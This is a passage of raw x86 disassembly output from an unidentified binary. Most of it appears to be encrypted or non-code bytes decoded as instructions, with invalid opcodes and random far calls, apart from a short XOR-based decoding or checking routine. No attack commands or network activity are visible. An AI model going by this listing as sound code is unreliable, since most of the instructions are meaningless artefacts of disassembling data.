  407436:	sbb    al,0x81
  407438:	jp     0x40745c
  40743a:	sub    al,dh
  40743c:	add    DWORD PTR [esi-0x26],ecx
  40743f:	test   eax,0x5c612dd5
  407444:	int    0x7f
  407446:	fs jno 0x407490
  407449:	das    
  40744a:	(bad)  
  40744c:	mov    WORD PTR [esi+0x32],ds
  40744f:	add    eax,DWORD PTR [esi]
  407451:	das    
  407452:	sub    DWORD PTR [esi],0xaa02f5ea
  407458:	outs   dx,BYTE PTR ds:[esi]
  407459:	mov    BYTE PTR [edi+0x5c],al
  40745c:	call   0x9b160e5e
  407461:	sar    DWORD PTR [esi+0x41],0x63
  407465:	dec    edx
  407466:	es out dx,eax
  407468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407469:	jne    0x4074e3
  40746b:	test   BYTE PTR [ebx-0x32e3aba7],dh
  407471:	mov    dl,ah
  407473:	les    eax,FWORD PTR [edx+0x34]
  407476:	add    esp,ebp
  407478:	test   al,0xfa
  40747a:	push   0xf6412efd
  40747f:	jmp    0x4a5e1f2f
  407484:	(bad)  
  407485:	sbb    al,0x55
  407487:	jno    0x4074f6
  407489:	adc    dl,bl
  40748b:	in     eax,0xe3
  40748d:	pusha  
  40748e:	jle    0x407503
  407490:	(bad)  
  407491:	sub    DWORD PTR [esi-0x6],ecx
  407494:	mov    bl,0x58
  407496:	nop
  407497:	stos   BYTE PTR es:[edi],al
  407498:	push   esp
  407499:	imul   esi,DWORD PTR [eax-0x21],0xcb1c17ed
  4074a0:	xor    al,0x95
  4074a2:	pop    ebx
  4074a3:	jg     0x407502
  4074a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a6:	xchg   DWORD PTR [eax+0x61c72d46],ecx
  4074ac:	jl     0x4074fb
  4074ae:	or     eax,0xc750d8c3
  4074b3:	jo     0x407520
  4074b5:	sub    BYTE PTR [ecx+0x72b63b7],bh
  4074bb:	xor    al,0xc9
  4074bd:	fcomp  DWORD PTR [eax]
  4074bf:	lods   eax,DWORD PTR ds:[esi]
  4074c0:	outs   dx,BYTE PTR ds:[esi]
  4074c1:	and    al,0x52
  4074c3:	push   ds
  4074c4:	sbb    BYTE PTR ds:0x6ae70dc6,ah
  4074ca:	aaa    
  4074cb:	jecxz  0x40745f
  4074cd:	dec    edi
  4074ce:	fwait
  4074cf:	pop    eax
  4074d0:	dec    ebp
  4074d1:	data16 xor BYTE PTR [edi+0x5fc879b6],al
  4074d8:	mov    ebx,0xc3b03a91
  4074dd:	lods   al,BYTE PTR ds:[esi]
  4074de:	inc    edx
  4074df:	xchg   esp,eax
  4074e0:	(bad)  
  4074e1:	es in  eax,0xbe
  4074e4:	jb     0x4074d2
  4074e6:	pop    ebp
  4074e7:	adc    al,0x65
  4074e9:	lahf   
  4074ea:	test   al,0xa5
  4074ec:	cmp    DWORD PTR [ecx-0x75b96bb7],0xe17c5cf
  4074f6:	xchg   ebp,eax
  4074f7:	int3   
  4074f8:	call   0x437:0x25d3d458
  4074ff:	sbb    al,0x86
  407501:	in     al,0x43
  407503:	add    eax,DWORD PTR [ecx-0x50]
  407506:	sti    
  407507:	sub    bh,cl
  407509:	in     eax,dx
  40750a:	stc    
  40750b:	xchg   ebx,eax
  40750c:	test   ebx,ebx
  40750e:	sbb    BYTE PTR [ebx+0x78],bl
  407511:	in     eax,0x1e
  407513:	and    bh,BYTE PTR [edx-0x20a32fc0]
  407519:	xchg   edi,eax
  40751a:	inc    ebp
  40751b:	and    bl,ah
  40751d:	into   
  40751e:	mov    edx,0x242338d7
  407523:	lahf   
  407524:	popa   
  407525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407526:	mov    BYTE PTR [ebx],bh
  407528:	call   0xdaf284d
  40752d:	cdq    
  40752e:	push   ss
  40752f:	xchg   BYTE PTR [ebx-0x79],al
  407532:	push   ecx
  407533:	dec    ebx
  407534:	imul   eax,DWORD PTR ds:0xf727e3be,0xef2ff67a
  40753e:	es mov dl,0xb
  407541:	ja     0x4075b8
  407543:	in     al,dx
  407544:	xchg   DWORD PTR [ebx],ebp
  407546:	inc    esi
  407547:	push   eax
  407548:	and    ebp,ebp
  40754a:	mov    cs,WORD PTR [esi-0x58]
  40754d:	ret    0x89f2
  407550:	sub    BYTE PTR [esi],bh
  407552:	xor    al,ah
  407554:	retf   
  407555:	stos   DWORD PTR es:[edi],eax
  407556:	cld    
  407557:	outs   dx,DWORD PTR ds:[esi]
  407558:	or     eax,esi
  40755a:	fbld   TBYTE PTR [edx]
  40755c:	popf   
  40755d:	mov    al,ds:0xbdaad34b
  407562:	popa   
  407563:	mov    al,ds:0xce5f14be
  407568:	jbe    0x407537
  40756a:	cs xchg esi,eax
  40756c:	outs   dx,DWORD PTR ds:[esi]
  40756d:	ret    
  40756e:	in     al,dx
  40756f:	cmp    bh,BYTE PTR [esi-0x37]
  407572:	fisttp QWORD PTR [ebp+0xed14283]
  407578:	push   ds
  407579:	dec    ecx
  40757a:	lods   al,BYTE PTR ds:[esi]
  40757b:	inc    esp
  40757c:	fstp   st(7)
  40757e:	sub    BYTE PTR [ebx+0x72e4fadc],ch
  407584:	xor    eax,0xeee1d26b
  407589:	push   0x72
  40758b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40758c:	inc    ebp
  40758d:	push   es
  40758e:	dec    ebx
  40758f:	in     al,0x50
  407591:	mov    ecx,DWORD PTR [ebp-0x4c]
  407594:	shrd   eax,ecx,0x2
  407598:	shr    ecx,0x2
  40759b:	mov    cx,ax
  40759e:	mov    eax,DWORD PTR [ebp-0x50]
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x70
  407613:	out    dx,eax
  407614:	adc    ch,BYTE PTR [edx+0x18187d17]
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    BYTE PTR [eax],ah
  40761f:	xchg   BYTE PTR [eax],cl
  407621:	sub    DWORD PTR [eax-0x53],ebx
  407624:	cmp    al,0x1c
  407626:	cmp    dh,dh
  407628:	jle    0x407698
  40762a:	psrlw  mm0,QWORD PTR [ecx-0x17]
  40762e:	aas    
  40762f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407630:	dec    edi
  407631:	test   dh,dh
  407633:	jnp    0x407628
  407635:	push   ebx
  407636:	mov    bl,0x75
  407638:	je     0x4075c0
  40763a:	lock cmc 
  40763c:	test   eax,0x5e728875
  407641:	int    0x81
  407643:	imul   ebx,DWORD PTR [edi-0x3e],0xc81449e8
  40764a:	fsubr  DWORD PTR [edi-0x6f53bc37]
  407650:	lahf   
  407651:	enter  0x9059,0x7d
  407655:	test   al,0x12
  407657:	sub    al,0x6
  407659:	jne    0x407610
  40765b:	cld    
  40765c:	call   0xc23465be
  407661:	mov    ecx,cs
  407663:	jbe    0x4076e0
  407665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407666:	sbb    BYTE PTR cs:[edi+0x47],cl
  40766a:	jmp    0x40763f
  40766c:	push   ds
  40766d:	out    dx,eax
  40766e:	icebp  
  40766f:	xchg   ebx,eax
  407670:	mov    esi,0x3705d382
  407675:	push   esi
  407676:	sbb    cl,BYTE PTR [eax+0x3fbb3dbc]
  40767c:	repz jecxz 0x407624
  40767f:	sbb    al,ah
  407681:	sahf   
  407682:	cdq    
  407683:	pusha  
  407684:	(bad)  
  407685:	rcr    dl,1
  407687:	jmp    0x40765d
  407689:	clc    
  40768a:	dec    esi
  40768b:	and    esp,DWORD PTR [edi]
  40768d:	xchg   edi,eax
  40768e:	inc    dl
  407690:	sbb    cl,BYTE PTR [esi-0x78]
  407693:	mov    dl,0x3b
  407695:	idiv   dh
  407697:	loop   0x40765d
  407699:	out    dx,eax
  40769a:	sbb    dl,dh
  40769c:	cmp    BYTE PTR [ecx+0x14],ah
  40769f:	mov    eax,0x90db4801
  4076a4:	push   edx
  4076a5:	mov    ch,0xaa
  4076a7:	fs mov al,0x78
  4076aa:	xchg   BYTE PTR [ecx-0x6d2ca8c6],dh
  4076b0:	jnp    0x407639
  4076b2:	scas   al,BYTE PTR es:[edi]
  4076b3:	jge    0x407657
  4076b5:	or     DWORD PTR [eax+edx*4+0x5e898071],ebp
  4076bc:	fbstp  TBYTE PTR [edx]
  4076be:	nop
  4076bf:	aam    0x7f
  4076c1:	aaa    
  4076c2:	xchg   ebp,eax
  4076c3:	xor    DWORD PTR [ebx+0x11],edi
  4076c6:	xor    BYTE PTR [edi],dh
  4076c8:	adc    ch,dl
  4076ca:	(bad)  
  4076cb:	in     eax,0xe7
  4076cd:	popf   
  4076ce:	pop    esp
  4076cf:	push   ebx
  4076d0:	clc    
  4076d1:	iret   
  4076d2:	sbb    al,0x66
  4076d4:	data16 jae 0x4076f4
  4076d7:	add    BYTE PTR [edx*2+0x74cd7e60],0x4b
  4076df:	push   ss
  4076e0:	or     DWORD PTR [ecx-0x6d9a5f66],eax
  4076e6:	call   0x452516c2
  4076eb:	loope  0x4076a8
  4076ed:	mov    ah,0x86
  4076ef:	xchg   ecx,eax
  4076f0:	push   eax
  4076f1:	fnstsw WORD PTR [esi-0x18]
  4076f4:	push   esp
  4076f5:	push   es
  4076f6:	call   0xc4758b92
  4076fb:	xchg   ecx,eax
  4076fc:	rcl    BYTE PTR [ebp-0x6e],0xa5
  407700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407701:	test   al,0x32
  407703:	inc    ebx
  407704:	cmp    al,BYTE PTR [eax-0x5122779]
  40770a:	pop    ds
  40770b:	rol    DWORD PTR [ebx+ecx*8+0x75],0xec
  407710:	sbb    bl,BYTE PTR [bx-0x22]
  407714:	sbb    al,BYTE PTR [edx-0x606a1322]
  40771a:	mov    ecx,0xd6f37bd8
  40771f:	or     dh,BYTE PTR [esi]
  407721:	(bad)  
  407722:	dec    esp
  407723:	mov    ch,0x36
  407725:	js     0x407790
  407727:	call   0x58af9997
  40772c:	dec    sp
  40772f:	cmp    edx,DWORD PTR [edx+edx*2+0x5f]
  407733:	inc    eax
  407734:	ins    BYTE PTR es:[edi],dx
  407735:	scas   al,BYTE PTR es:[edi]
  407736:	test   BYTE PTR [esi+0x4c326023],bh
  40773c:	or     eax,0x15eb9e73
  407741:	dec    ecx
  407742:	lock and DWORD PTR ds:0x5f9b2561,0xfcce1a9c
  40774d:	or     eax,0x6ed04b45
  407752:	pop    esp
  407753:	push   es
  407754:	mov    esp,0x421f131
  407759:	out    dx,al
  40775a:	lea    esp,[eax+esi*8+0x7dd097b0]
  407761:	mov    cl,0xa1
  407763:	sbb    al,BYTE PTR [eax+0x3bc6b53b]
  407769:	loope  0x407799
  40776b:	std    
  40776c:	inc    ebp
  40776d:	jg     0x407731
  40776f:	xor    bp,WORD PTR [ecx-0x195635ea]
  407776:	call   0x5c29:0x8a6bc416
  40777d:	jb     0x4077fc
  40777f:	fs hlt 
  407781:	loope  0x40776f
  407783:	xor    cl,bh
  407785:	out    dx,eax
  407786:	mov    eax,0x5e937f8d
  40778b:	outs   dx,DWORD PTR ds:[esi]
  40778c:	(bad)  
  40778d:	and    edi,DWORD PTR [ebx-0x313b8996]
  407793:	mov    esi,0xbf5fee7
  407798:	cmp    BYTE PTR [ebp+0xe],dl
  40779b:	enter  0xea67,0x37
  40779f:	fwait
  4077a0:	shl    BYTE PTR [edx-0xe],1
  4077a3:	int    0xc4
  4077a5:	jg     0x407788
  4077a7:	test   BYTE PTR [eax],dh
  4077a9:	(bad)  [ecx-0x4e]
  4077ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ad:	sti    
  4077ae:	iret   
  4077af:	or     ebp,esi
  4077b1:	and    eax,0x83bcb2eb
  4077b6:	(bad)  
  4077b7:	cmp    al,0x1
  4077b9:	add    BYTE PTR [ecx],ch
  4077bb:	or     esi,DWORD PTR [ebx+0x31]
  4077be:	lods   al,BYTE PTR ds:[esi]
  4077bf:	adc    ebp,0xaaa218e8
  4077c5:	pop    es
  4077c6:	xchg   DWORD PTR [eax+0x35fab64c],edx
  4077cc:	push   0xffffff96
  4077ce:	mov    ch,BYTE PTR [ecx+0x5b3ca0a3]
  4077d4:	aaa    
  4077d5:	mov    bh,BYTE PTR [edi-0x67]
  4077d8:	aaa    
  4077d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077da:	ds leave 
  4077dc:	sbb    eax,0xfffffff4
  4077df:	adc    BYTE PTR [edi],dh
  4077e1:	enter  0x238c,0xee
  4077e5:	xor    DWORD PTR [ebx+0x6e],eax
  4077e8:	outs   dx,BYTE PTR ds:[esi]
  4077e9:	das    
  4077ea:	(bad)  
  4077eb:	cli    
  4077ec:	mov    DWORD PTR [eax+0x5f],ebx
  4077ef:	popa   
  4077f0:	fisub  WORD PTR [ecx+0x30cb6ab1]
  4077f6:	push   edi
  4077f7:	aad    0xdf
  4077f9:	data16 std 
  4077fb:	call   0x64be:0xedb4a0ea
  407802:	icebp  
  407803:	and    al,0xca
  407805:	jb     0x40786e
  407807:	push   ecx
  407808:	aas    
  407809:	mov    esp,0x618fac5e
  40780e:	push   0x3173b674
  407813:	leave  
  407814:	push   ds
  407815:	push   ebp
  407816:	or     edi,DWORD PTR [esi-0x64]
  407819:	jb     0x4077ed
  40781b:	inc    ecx
  40781c:	dec    esp
  40781d:	pop    ebx
  40781f:	mov    ds:0xe6ab3b5a,al
  407824:	dec    eax
  407825:	jno    0x407847
  407827:	pop    ebx
  407828:	les    edi,FWORD PTR [esi]
  40782a:	sub    esp,edi
  40782c:	test   eax,0xa6ec4ccc
  407831:	jg     0x40787f
  407833:	xor    al,BYTE PTR [esi+0xd98aa33]
  407839:	push   esi
  40783a:	sub    eax,0xd91df508
  40783f:	mov    edx,0x774cabc0
  407844:	and    esi,esp
  407846:	or     bh,BYTE PTR [ebx+edi*4]
  407849:	push   ebx
  40784a:	imul   BYTE PTR [esi]
  40784c:	jo     0x407877
  40784e:	adc    BYTE PTR [ebx-0x14],cl
  407851:	ret    
  407852:	push   edx
  407853:	jno    0x407843
  407855:	stos   BYTE PTR es:[edi],al
  407856:	pop    esp
  407857:	push   edx
  407858:	jbe    0x4078aa
  40785a:	call   0x3e05:0x195a1b6d
  407861:	jecxz  0x407830
  407863:	mov    dh,0xbc
  407865:	pop    ebp
  407866:	scas   al,BYTE PTR es:[edi]
  407867:	sar    DWORD PTR [esp+edi*1],1
  40786a:	outs   dx,DWORD PTR ds:[esi]
  40786b:	imul   esp,edx,0x4a
  40786e:	fidiv  DWORD PTR [ebx+edx*1+0x73]
  407872:	cli    
  407873:	mov    ebx,0x6b7dbd22
  407878:	xchg   esi,eax
  407879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40787a:	or     eax,DWORD PTR [ebp-0x6e]
  40787d:	cmc    
  40787e:	pop    ss
  40787f:	in     eax,0x70
  407881:	fnstcw WORD PTR [esi+0x7c8425e8]
  407887:	shl    DWORD PTR [eax],cl
  407889:	retf   0x5283
  40788c:	add    DWORD PTR [edi],edi
  40788e:	cdq    
  40788f:	(bad)  
  407890:	cmp    eax,0x33913fa9
  407895:	in     al,dx
  407896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407897:	mov    ecx,0x7e1bbe90
  40789c:	push   ebp
  40789d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40789e:	sub    dh,BYTE PTR [edx-0x4d330e49]
  4078a4:	or     al,0x42
  4078a6:	dec    esp
  4078a7:	(bad)  
  4078a8:	loopne 0x4078a1
  4078aa:	fs clc 
  4078ac:	loopne 0x4078a8
  4078ae:	sub    al,0xe3
  4078b0:	fbstp  TBYTE PTR [edx]
  4078b2:	test   al,0xc7
  4078b4:	push   edi
  4078b5:	fist   WORD PTR ds:0xada513f9
  4078bb:	xor    BYTE PTR [ebx+ebp*4-0x5d],0x43
  4078c0:	in     eax,0x2e
  4078c2:	mov    bh,0x98
  4078c4:	or     BYTE PTR [ecx-0x420d2cca],dl
  4078ca:	jno    0x40790d
  4078cc:	add    bl,BYTE PTR [ecx+0x71237c4b]
  4078d2:	xor    BYTE PTR [ebx+0x2],cl
  4078d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d6:	cld    
  4078d7:	test   DWORD PTR [ecx],ebp
  4078d9:	out    dx,al
  4078da:	fstp   TBYTE PTR [edx]
  4078dc:	aad    0x82
  4078de:	imul   eax,DWORD PTR [ecx],0xffffff81
  4078e1:	pop    ds
  4078e2:	ins    BYTE PTR es:[edi],dx
  4078e3:	outs   dx,BYTE PTR ds:[esi]
  4078e4:	out    dx,eax
  4078e5:	aas    
  4078e6:	xor    eax,0xdc5a4465
  4078eb:	dec    ebx
  4078ec:	mov    edi,0xadbf1a33
  4078f1:	ins    DWORD PTR es:[edi],dx
  4078f2:	ret    0x850d
  4078f5:	jmp    ecx
  4078f7:	lock add al,0xee
  4078fa:	cld    
  4078fb:	lahf   
  4078fc:	fucomp st(2)
  4078fe:	clc    
  4078ff:	pop    esi
  407900:	fistp  WORD PTR [ecx]
  407902:	sub    eax,0xcd36d94f
  407907:	add    eax,0xede7b8e5
  40790c:	push   ebp
  40790d:	push   edi
  40790e:	jl     0x4078ac
  407910:	fdivr  DWORD PTR [ebx]
  407912:	sub    ah,cl
  407914:	das    
  407915:	test   BYTE PTR [ebp+0x76],0xef
  407919:	adc    al,0x5a
  40791b:	mov    bl,0x6a
  40791d:	pop    ebp
  40791e:	xor    BYTE PTR [ebx+0x78],al
  407921:	mov    dh,BYTE PTR [esp+ebx*8+0x599412a]
  407928:	call   0x4b0b:0x969434ca
  40792f:	idiv   BYTE PTR [ecx+ebp*1]
  407932:	or     eax,0xe08586cf
  407937:	pop    es
  407938:	xchg   ecx,eax
  407939:	test   eax,0xc1103103
  40793e:	dec    esp
  40793f:	retf   
  407940:	rcr    BYTE PTR ss:[esi+eiz*2+0x1c],0x48
  407946:	push   ebx
  407947:	mov    ds:0x6a32abc3,eax
  40794c:	jp     0x4079bc
  40794e:	into   
  40794f:	test   eax,0x9d60560e
  407954:	in     eax,0x51
  407956:	or     ah,BYTE PTR [esi-0xf]
  407959:	shr    WORD PTR [esi+0x7fe946c2],cl
  407960:	adc    DWORD PTR [edx+0x29],0x9a483640
  407967:	out    0x19,al
  407969:	inc    ecx
  40796a:	push   edx
  40796b:	pop    esp
  40796c:	cwde   
  40796d:	mov    cs,ebp
  40796f:	iret   
  407970:	cmp    DWORD PTR [ebp+ebp*8+0x38d7e43a],0x75e2f62d
  40797b:	jg     0x407990
  40797d:	dec    edx
  40797e:	lods   eax,DWORD PTR ds:[esi]
  40797f:	mov    eax,0x3208aab4
  407984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407985:	call   0xa1fa:0x911dad42
  40798c:	and    esp,esp
  40798e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40798f:	xchg   DWORD PTR [eax],edx
  407991:	sbb    eax,0xa4ca3d3c
  407996:	adc    cl,ch
  407998:	adc    al,0x98
  40799a:	sub    BYTE PTR [ebp-0xd3773c7],ah
  4079a0:	arpl   WORD PTR [ebx],cx
  4079a2:	ret    
  4079a3:	xor    eax,0xcdb15b9e
  4079a8:	sub    ebp,ebx
  4079aa:	mov    esp,0x21016ae8
  4079af:	mov    eax,0x9ef6203
  4079b4:	addr16 pop es
  4079b6:	icebp  
  4079b7:	add    al,0x9e
  4079b9:	cld    
  4079ba:	lods   al,BYTE PTR ds:[esi]
  4079bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079bc:	fptan  
  4079be:	mov    bl,bl
  4079c0:	ins    DWORD PTR es:[edi],dx
  4079c1:	leave  
  4079c2:	aas    
  4079c3:	push   ebx
  4079c4:	aas    
  4079c5:	push   esi
  4079c6:	sub    esp,esp
  4079c8:	pop    ebp
  4079c9:	mov    bl,0xae
  4079cb:	xor    edx,DWORD PTR ss:[ebx+0x43]
  4079cf:	and    al,dl
  4079d1:	inc    ebp
  4079d2:	popa   
  4079d3:	adc    BYTE PTR [edi],dh
  4079d5:	in     al,0xcf
  4079d7:	stos   BYTE PTR es:[edi],al
  4079d8:	jns    0x407998
  4079da:	lds    esp,FWORD PTR [eax+0x5d]
  4079dd:	pop    ecx
  4079de:	test   al,0x89
  4079e0:	inc    ebp
  4079e1:	int3   
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x4079be
  4079f4:	fcom   DWORD PTR [ebp-0x56]
  4079f7:	popf   
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi-0x46e7e7ee],bl
  407a00:	loope  0x407a03
  407a02:	daa    
  407a03:	xor    edx,DWORD PTR [esi-0x27]
  407a06:	fistp  DWORD PTR [esi]
  407a08:	jg     0x407a3b
  407a0a:	push   esi
  407a0b:	inc    edx
  407a0c:	jns    0x4079cd
  407a0e:	ror    BYTE PTR [eax+eax*4+0x3a],0x5e
  407a13:	bound  edi,QWORD PTR [esi]
  407a15:	push   edx
  407a16:	push   ds
  407a17:	arpl   WORD PTR [ebp+ebp*2+0x3faa713f],di
  407a1e:	mov    dh,0x93
  407a20:	idiv   BYTE PTR [eax]
  407a22:	cmp    eax,0xc8e9ba7e
  407a27:	ret    
  407a28:	cdq    
  407a29:	xor    DWORD PTR [edx],esp
  407a2b:	aad    0x49
  407a2d:	fldl2t 
  407a2f:	(bad)  
  407a30:	or     DWORD PTR [edx-0x56],eax
  407a33:	push   0x49aed54e
  407a38:	or     dh,cl
  407a3a:	dec    edi
  407a3b:	mov    cl,0x9d
  407a3d:	loop   0x407a63
  407a3f:	add    esp,DWORD PTR [esi]
  407a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a42:	rcr    ebp,cl
  407a44:	popf   
  407a45:	jbe    0x4079f9
  407a47:	shl    DWORD PTR [edx+0x2f],1
  407a4a:	push   ecx
  407a4b:	aad    0xc
  407a4d:	xor    al,0xee
  407a4f:	mov    cl,0xa5
  407a51:	xchg   BYTE PTR [edx],al
  407a53:	or     bl,0x9a
  407a56:	add    dh,BYTE PTR [esi-0x1f1a9adf]
  407a5c:	sub    ebp,0x20
  407a5f:	xlat   BYTE PTR ds:[ebx]
  407a60:	(bad)  
  407a61:	int    0x1a
  407a63:	sahf   
  407a64:	cmp    dl,BYTE PTR [ecx+0x41]
  407a67:	fidiv  WORD PTR ds:0xa6b81e89
  407a6d:	cmp    al,0x8c
  407a6f:	xor    eax,0xe2e47d9c
  407a74:	retf   0x9df8
  407a77:	retf   0x1ece
  407a7a:	or     BYTE PTR ds:0x111af9e2,ah
  407a80:	fldenv [eax]
  407a82:	dec    ebx
  407a83:	arpl   WORD PTR [ecx],bx
  407a85:	sti    
  407a86:	dec    ecx
  407a87:	mov    BYTE PTR [eax],0x59
  407a8a:	add    al,0x8b
  407a8c:	test   eax,0xc94acb06
  407a91:	fidiv  DWORD PTR [edi+0x398ebd59]
  407a97:	push   esi
  407a98:	leave  
  407a99:	int3   
  407a9a:	lahf   
  407a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a9c:	lods   al,BYTE PTR ds:[esi]
  407a9d:	ficom  DWORD PTR [ebp-0x6cfc45d7]
  407aa3:	jb     0x407a34
  407aa5:	pusha  
  407aa6:	stos   BYTE PTR es:[edi],al
  407aa7:	jne    0x407ac5
  407aa9:	inc    esi
  407aaa:	(bad)  
  407aab:	pop    ecx
  407aac:	fstp   QWORD PTR [edx]
  407aae:	push   ds
  407aaf:	fist   DWORD PTR [ebx]
  407ab1:	jmp    0x407ad5
  407ab3:	(bad)  
  407ab4:	mov    bh,0x4a
  407ab6:	adc    al,0xbc
  407ab8:	out    0x43,al
  407aba:	adc    dh,0x37
  407abd:	hlt    
  407abe:	pusha  
  407abf:	mov    ebp,0x9748df34
  407ac4:	push   ss
  407ac5:	xchg   BYTE PTR [ebp-0x5436ba3f],cl
  407acb:	fcmovnb st,st(0)
  407acd:	push   esp
  407ace:	mov    edi,0x54f4ee4c
  407ad3:	dec    ebp
  407ad4:	std    
  407ad5:	pop    ebx
  407ad6:	ret    
  407ad7:	pop    eax
  407ad8:	fsubr  DWORD PTR [ebp+edx*8-0x6329a127]
  407adf:	push   ds
  407ae0:	xor    DWORD PTR [ebx-0x3362346c],ecx
  407ae6:	jns    0x407b42
  407ae8:	popa   
  407ae9:	jnp    0x407b19
  407aeb:	rcl    BYTE PTR [ebp-0x2d],0xee
  407aef:	(bad)  [ebp-0x2f]
  407af2:	aaa    
  407af3:	dec    DWORD PTR [ebx+0x3027184c]
  407af9:	in     eax,0x0
  407afb:	cmp    esp,DWORD PTR ds:[esi]
  407afe:	call   0x76bb:0xf3dbb7df
  407b05:	fsubr  DWORD PTR [edx]
  407b07:	jge    0x407b56
  407b09:	mov    bl,0x96
  407b0b:	mov    esp,0x8b96790c
  407b10:	mov    ds:0x49bf70c9,al
  407b15:	rol    BYTE PTR [esi+0xf3efa53],1
  407b1b:	out    dx,al
  407b1c:	dec    esp
  407b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b1e:	mov    ebp,0x10e0b4a7
  407b23:	(bad)  
  407b24:	stc    
  407b25:	or     al,0xeb
  407b27:	push   0x7ca39afd
  407b2c:	ret    
  407b2d:	mov    dh,0x2
  407b2f:	enter  0xb9f4,0x3d
  407b33:	out    0x70,eax
  407b35:	sub    esp,ebp
  407b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b38:	lahf   
  407b39:	popw   ss
  407b3b:	dec    esi
  407b3c:	pop    esp
  407b3d:	inc    esi
  407b3e:	or     BYTE PTR es:[edx-0x24e28c3f],dl
  407b45:	xor    eax,0x31fadb7b
  407b4a:	adc    edi,DWORD PTR [ebp-0x22]
  407b4d:	push   ebp
  407b4f:	out    dx,eax
  407b50:	int    0x95
  407b52:	dec    ecx
  407b53:	xchg   ecx,eax
  407b54:	sub    eax,eax
  407b56:	in     eax,dx
  407b57:	or     cl,ah
  407b59:	(bad)  
  407b5a:	out    dx,al
  407b5b:	fstp   TBYTE PTR [ecx+edx*2+0x5d]
  407b5f:	lea    ebx,ds:0xdde961f3
  407b65:	inc    ebx
  407b66:	mov    eax,ds:0xb2c39ab2
  407b6b:	inc    esi
  407b6c:	hlt    
  407b6d:	fistp  DWORD PTR [esi+ebp*4-0x74]
  407b71:	ins    BYTE PTR es:[edi],dx
  407b72:	xor    BYTE PTR [ecx+0x1ed0a7],bl
  407b78:	cwde   
  407b79:	xchg   DWORD PTR [eax+0x35],ebx
  407b7c:	and    al,0xc6
  407b7e:	mov    eax,0xe656048a
  407b83:	jp     0x407b4e
  407b85:	sahf   
  407b86:	xor    cl,ch
  407b88:	mov    DWORD PTR [ecx],edi
  407b8a:	add    DWORD PTR [edx+0x13c73428],edi
  407b90:	jae    0x407b27
  407b92:	sti    
  407b93:	or     edi,DWORD PTR [edx-0x36]
  407b96:	mov    esp,DWORD PTR [esi+0x3ec2151e]
  407b9c:	fwait
  407b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b9e:	cli    
  407b9f:	daa    
  407ba0:	cmp    eax,0x8443a1b4
  407ba5:	icebp  
  407ba6:	pop    ebp
  407ba7:	push   0xc940f36a
  407bac:	ret    0xf8f3
  407baf:	mov    al,ah
  407bb1:	inc    edx
  407bb2:	jae    0x407b9d
  407bb4:	xchg   ebx,eax
  407bb5:	pop    esp
  407bb6:	or     DWORD PTR [esi-0x778d6d39],esi
  407bbc:	fisub  DWORD PTR [edx-0x1863c43f]
  407bc2:	mov    al,ds:0x4417ae92
  407bc7:	outs   dx,BYTE PTR ds:[esi]
  407bc8:	std    
  407bc9:	and    eax,DWORD PTR [eax+0x5cf54539]
  407bcf:	sbb    BYTE PTR [eax-0x62],0x2b
  407bd3:	cmp    al,0xfe
  407bd5:	mov    al,ds:0x6fcc2294
  407bda:	or     edx,DWORD PTR [ebp-0x32]
  407bdd:	cs cli 
  407bdf:	popa   
  407be0:	in     al,dx
  407be1:	imul   esp,DWORD PTR [edx+0x32a72fcf],0x68
